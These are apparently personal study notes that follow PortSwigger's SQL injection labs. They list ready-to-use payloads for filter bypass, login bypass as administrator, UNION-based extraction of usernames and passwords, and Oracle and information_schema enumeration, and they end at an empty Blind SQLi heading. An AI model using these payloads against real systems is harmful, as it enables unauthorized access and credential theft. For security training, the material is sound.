https://portswigger.net/web-security/sql-injection
*Note: all code below are meant for OracleDB (except `information_schema` related), please check [Syntax Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for other variants'*

### WHERE Clause
`SELECT * FROM products WHERE category = '{}' AND released = 1`  
Attack (GET URL): ?category='+OR+1%3d1--  

### Login Bypass (Subvert Logic)
`SELECT * FROM users WHERE username = '{}' AND password = '{}'`  
Attack (POST Method): username=administrator'--&password=123  

### UNION Attacks
**Conditions**  
1. Both queries must return same number of columns  
`ORDER BY {index number}`  
2. Compatible data types in each column  
`UNION SELECT NULL,'a',NULL,NULL`  

**Techniques**  
1. Retrieving multiple values within a single column (concatenation)  
`UNION SELECT NULL,username||'~'||password FROM users`  

### Examine Database
`SELECT banner FROM v$version`  
`SELECT table_name FROM all_tables  
SELECT column_name FROM all_tab_columns WHERE table_name='{}'`  

**Non-Oracle DB:**  
`SELECT table_name FROM information_schema.tables  
SELECT column_name FROM information_schema.columns WHERE table_name='{}'`  

### Blind SQLi
